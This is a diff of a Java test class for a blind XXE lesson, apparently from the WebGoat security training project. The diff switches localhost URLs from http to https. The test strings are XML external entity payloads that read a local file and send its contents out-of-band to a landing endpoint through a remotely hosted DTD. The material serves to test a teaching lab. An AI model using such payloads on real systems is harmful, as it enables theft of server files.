@@ -112,7 +112,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
             + "<!ENTITY % file SYSTEM \""
             + targetFile.toURI().toString()
             + "\">\n"
-            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
+            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'https://localhost:"
             + port
             + "/landing?text=%file;'>\">\n"
             + "%all;";
@@ -126,7 +126,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
     String xml =
         "<?xml version=\"1.0\"?>"
             + "<!DOCTYPE comment ["
-            + "<!ENTITY % remote SYSTEM \"http://localhost:"
+            + "<!ENTITY % remote SYSTEM \"https://localhost:"
             + port
             + "/files/test.dtd\">"
             + "%remote;"
@@ -142,7 +142,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
     // Host DTD on WebWolf site
     String dtd =
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
+            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'https://localhost:"
             + port
             + "/landing?text=%file;'>\">\n";
     webwolfServer.stubFor(
@@ -158,7 +158,7 @@ class BlindSendFileAssignmentTest extends LessonTest {
             + "<!ENTITY % file SYSTEM \""
             + targetFile.toURI()
             + "\">\n"
-            + "<!ENTITY % remote SYSTEM \"http://localhost:"
+            + "<!ENTITY % remote SYSTEM \"https://localhost:"
             + port
             + "/files/test.dtd\">"
             + "%remote;"
